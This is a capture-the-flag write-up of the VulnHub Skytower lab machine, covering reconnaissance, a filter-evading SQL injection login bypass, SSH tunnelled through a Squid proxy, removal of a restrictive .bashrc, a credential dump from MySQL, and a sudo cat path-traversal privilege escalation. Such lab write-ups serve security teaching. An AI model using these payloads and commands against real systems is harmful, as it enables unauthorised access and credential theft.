# 🖥️ Skytower — VulnHub

| Field | Details |
|---|---|
| 🏷️ Machine | Skytower |
| 🌐 Platform | VulnHub |
| 🎯 Difficulty | Medium |
| 🧠 Topics | SQL Injection, SQUID Proxy, SSH Tunneling, .bashrc bypass, sudo PrivEsc |
| 📅 Date | 08-12-2025 |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |

---

## 📌 Summary

Skytower uses a SQL injection bypass on a login page to leak SSH credentials. SSH port 22 is filtered but accessible via a SQUID proxy tunnel. A restrictive `.bashrc` kicks users out immediately — deleted to get a stable shell. Privilege escalation uses `sudo /bin/cat` with path traversal to read the root flag, then switching to root with the leaked password.

---

## 🔍 1. Reconnaissance & Enumeration

### Network Discovery

```bash
sudo netdiscover
```

Target IP: **<TARGET_IP>**

### Port Scan

```bash
nmap -sCV <TARGET_IP>
```

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | Filtered |
| 80 | HTTP | Apache 2.2.22 |
| 3128 | HTTP Proxy | Squid 3.1.20 |

---

## 💥 2. Exploitation

### SQL Injection — Login Bypass

Browse to `http://<TARGET_IP>` — Skytech Login page.

Standard `OR` and `--` are filtered. Use MySQL alternatives:

```
Email:    ' || 1=1#
Password: anything
```

✅ **Login bypassed** — credentials leaked:

```
Username: john
Password: hereisjohn
```

---

## 🔌 3. SSH via SQUID Proxy Tunnel

Port 22 is filtered — tunnel through SQUID:

```bash
proxytunnel -p <TARGET_IP>:3128 -d <TARGET_IP>:22 -a 5555
```

Connect SSH through the tunnel:

```bash
ssh john@<TARGET_IP> -p 5555
```

> Problem: `.bashrc` closes connection immediately.

**Fix:**

```bash
ssh -t john@<TARGET_IP> -p 5555 'rm .bashrc'
ssh john@<TARGET_IP> -p 5555
```

✅ **Shell as `john`**

---

## 🔑 4. Post-Exploitation

```bash
cd /var/www
cat login.php
```

MySQL credentials: `root / root`

```bash
mysql -u root -p
```

```sql
USE SkyTech;
SHOW TABLES;
-- Tables_in_SkyTech: login

SELECT * FROM login;
```

**Full users table dumped:**

| id | email | password |
|---|---|---|
| 1 | john@skytech.com | hereisjohn |
| 2 | sara@skytech.com | ihatethisjob |
| 3 | william@skytech.com | senseable |

---

## ⬆️ 5. Privilege Escalation

### Switch to Sara (delete her .bashrc first)

```bash
ssh -t sara@<TARGET_IP> -p 5555 'rm .bashrc'
ssh sara@<TARGET_IP> -p 5555
# Password: ihatethisjob
```

### sudo -l

```
(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

### Path Traversal to Read Root Flag

```bash
sudo /bin/cat /accounts/../root.flag.txt
```

```
Congratz, have a cold one to celebrate!
root password is theskytower
```

### Switch to Root

```bash
su root
# Password: theskytower
```

✅ **Root shell obtained**

---

## 🚩 6. Flag

```
Congratz, have a cold one to celebrate!
root password is theskytower
```

---

## 📚 7. Lessons Learned

- SQL filter bypass: when `OR`/`--` blocked, try `||` and `#`
- SQUID proxies can tunnel SSH through firewall-filtered ports
- `.bashrc` logout is a real hardening trick — trivially bypassed with `-t 'rm .bashrc'`
- `sudo` path traversal bypasses directory restrictions

---

## 🛠️ Tools Used

- `netdiscover`, `nmap`, `proxytunnel`, `ssh`, `mysql`

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
